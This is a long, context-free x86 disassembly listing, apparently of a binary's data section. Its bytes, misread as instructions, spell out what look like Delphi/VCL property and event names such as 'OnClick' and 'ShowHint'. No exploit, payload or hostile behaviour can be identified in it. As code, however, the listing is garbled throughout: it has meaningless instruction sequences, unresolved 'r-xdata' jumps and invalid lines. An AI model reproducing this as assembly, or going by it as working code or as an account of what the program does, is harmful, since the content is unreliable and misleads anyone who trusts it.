add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ ebx + edx * 2 + 0x43 ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x207cc08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x43 ] cl
add [ esi + 0x21 ] ah
inc ebx
add [ edx + eax ] cl
add [ eax ] al
fcomp [ esi - 0x6463ffbd ]
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
jb r-xdata
je r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
add al 0x9c
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
je r-xdata
inc edx
outsd
je r-xdata
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bh
push ds
inc ebx
add [ esi ] al
add al ah
and al 0x44
add [ eax ] ch
je r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
mov al [ 0xffffffffec004354 ]
push esp
inc ebx
add [ eax - 0x7ffbcad ] dh
push ebx
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ eax ] bl
push ebp
inc ebx
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
cmp al 0x10
add [ eax ] al
sbb al 0x20
outsb
je r-xdata
insd
inc ebp
jbe r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
in al dx
outsb
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
dec eax
dec esp
push esi
inc ebx
add [ edi + edx * 2 ] bh
inc ebx
add al al
push edi
inc ebx
add [ eax + 0x40004356 ] bh
pop eax
inc ebx
add [ eax + ebx * 2 ] dl
inc ebx
add [ ebp + edx * 2 + 0x55d80043 ] dh
inc ebx
add [ edi ] al
push esp
inc edx
jne r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add ah bl
push ebp
inc ebx
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ esi + edx * 2 + 0x43 ] ah
add al dh
sbb al [ eax + eax - 0x60 ]
push esi
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
outsd
insb
lea eax [ eax ]
jl r-xdata
add ah ch
inc eax
outsd
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
add dh bh
jo r-xdata
je r-xdata
je r-xdata
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x3 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push [ eax ]
outsb
mov eax eax
add al 0x23
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x55500041 ] bh
insb
jae r-xdata
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ eax ] dh
je r-xdata
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ ecx + eax * 2 + 0x43529c00 ] bl
call 0xffffffffec435fc1
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
inc eax
adc [ ecx ] al
pop edi
add [ eax ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
xor al 0x40
add [ ebp + 0x21f00040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax + 0x3000441c ] ch
outsb
inc ebx
outsd
outsb
je r-xdata
sub [ edx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add bh bh
push esp
push es
inc esp
add [ ecx ] al
add [ eax + 0x4208000d ] al
outsb
[ ebx ] eax
js r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + 0x55 ] dl
cmp al 0x2
outsd
insb
jl r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
push [ eax ]
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
and al [ ebx ]
mul [ edx ]
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax ] dh
and [ ebx ] al
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x23
inc ebx
add [ edx + 0xb0043 ] cl
or [ ebx + 0x74 ] dl
inc ebx
add [ eax ] dl
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
mov ah 0x8e
inc ebx
add [ ecx + 0x43 ] cl
add [ ecx + 0x43 ] bh
add [ ecx + eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] 0x0
or eax [ ebx + 0x6f ]
xchg [ ebx ] eax
jpe r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add bh bh
jpe r-xdata
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add ah cl
and eax 0x3c0041
add dh bh
rcl ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc [ eax - 0x1e ]
inc ebx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
add [ eax + eax ] dl
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
xchg [ ebx ] eax
adc al 0x2
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
add bh bh
inc eax
loop r-xdata
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
scasd [ edi ]
inc ecx
add [ eax ] ch
mov es [ ebx ]
add bh bh
add al 0xe1
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
outsb
je r-xdata
insb
loopne r-xdata
jo r-xdata
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] eax
[ edx + eax ]
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
cmp al 0x55
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + ecx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ eax + 0x43 ]
adc [ eax ] al
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
xchg ebx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc esp
add [ ebx + ecx * 2 + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb eax 0x61540800
bound ecx [ edi + 0x72 ]
jb r-xdata
mov es [ ebx ]
add al 0x4b
adc [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx ] 0x0
add [ eax ] al
inc ebx
add [ ecx ] al
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] eax
rol [ ecx ] 0x0
jo r-xdata
cmp bh 0xff
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
loopne r-xdata
jo r-xdata
nop
inc ebx
add al bl
cwde
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
and al 0x0
or cl [ edi + 0x6e ]
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
add [ eax ] 0x0
xchg edx eax
inc ebx
add al ch
add [ eax ] al
je r-xdata
inc esp
jb r-xdata
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
jns r-xdata
je r-xdata
inc ebx
add [ eax ] cl
outsd
jo r-xdata
adc al 0x2
add [ eax ] al
xor [ eax ] ah
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
push ebp
jo r-xdata
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
jb r-xdata
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
outsb
push ebx
je r-xdata
dec edi
jo r-xdata
add [ eax ] al
jmp eax
dec esp
xchg ecx eax
inc ebx
add al ch
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
call 0xffffffffe94227a0
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
xchg ecx eax
inc ebx
add al bl
add [ eax ] eax
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
inc esp
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
inc esp
outsd
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + ebx * 2 + 0x4f940043 ] cl
inc esp
add [ eax - 0x3ffbbac ] dh
jb r-xdata
add [ eax ] al
call 0xffffffffd8436b73
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add ah ch
pop eax
inc ebx
add al dh
pop ecx
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xff
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ edx + ebx * 2 + 0x43 ] bh
add al dh
sbb al [ eax + eax - 0x2c ]
pop edx
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
inc ebx
add al ah
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
xchg esp eax
cwde
inc esp
jb r-xdata
inc ecx
add [ ebx + ebx * 4 + 0x588c0041 ] bh
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
pop esp
or [ eax + eax + 0x34 ] eax
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
shr [ bx + si ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
sub [ ebx ] eax
stosb [ edi ]
sub [ ebx ] eax
sub_43374f
pushfd
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ebx ] bh
add al [ eax ]
dec esp
add bh bh
loopne r-xdata
outsb
push ebx
insb
arpl [ gs : eax + esi - 0x51 ] si
inc ecx
add [ eax ] ch
add bh bh
inc eax
add [ eax ] cl
add al [ eax ]
push esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
jmp eax
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
add [ eax ] eax
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
and eax 0x754d0b00
jb r-xdata
loop r-xdata
push 0x40ff0000
pushfd
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
or dl [ eax + 0x61 ]
outsb
je r-xdata
insb
je r-xdata
add [ eax ] al
add [ 0x754d0b00 ] ah
insb
dec eax
imul esp [ gs : edi + 0x68 ] 0x40103c74
add [ eax ] cl
push 0x684c0043
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0023 ] al
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
inc ebp
js r-xdata
inc ebx
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
inc esp
add [ ebx + ecx * 2 + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
das
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ch
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax ]
jecxz r-xdata
add [ es : esi ] cl
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x411ae074
add [ eax ] bl
add al [ eax ]
[ eax + 0x100436b ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + ecx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
adc [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002d ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
insb
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ ebx ] cl
push eax
popad
jb r-xdata
pop es
push esi
imul esi [ ebx + 0x69 ] 0x88656c62
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
cmp al 0x2
add bh bh
push 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
[ eax + 0x43 ]
inc ebx
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
pushfd
mov es [ ebx ]
add al 0x4b
sub [ 0x68530800 ] 0x6f
ja r-xdata
adc [ eax ] al
test al 0x78
inc ebx
add ah al
js r-xdata
inc eax
add [ ecx - 0x63010000 ] bl
loop r-xdata
push 0x6948776f
outsb
je r-xdata
sub [ eax ] al
or edx [ eax + 0x61 ]
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
0xc0ff0000 0x43e2
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
outsb
je r-xdata
add [ ss : edi + ecx * 2 ] cl
outsb
inc esp
popad
js r-xdata
cmp al [ edx ]
add bh bh
xchg esp eax
imul eax [ ebx ] 0x1
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ cs : esi ] al
push ebx
outsd
jb r-xdata
add al [ eax ]
call [ ecx + ebp * 2 + 0x10043 ]
add [ eax ] al
sub al 0x0
or edx [ ebx + 0x63 ]
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
add [ edx + 0x43 ] ah
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002b ] al
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 4 + 0x11 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
test eax 0xd8ff0001
dec edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f09003c ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
dec ebx
jns r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
xor eax 0x6e4f0a00
inc esp
popad
je r-xdata
xor [ ebx ] al
pushad
add al [ eax ]
jmp [ eax + 0x2 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
je r-xdata
push ds
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
add bh bh
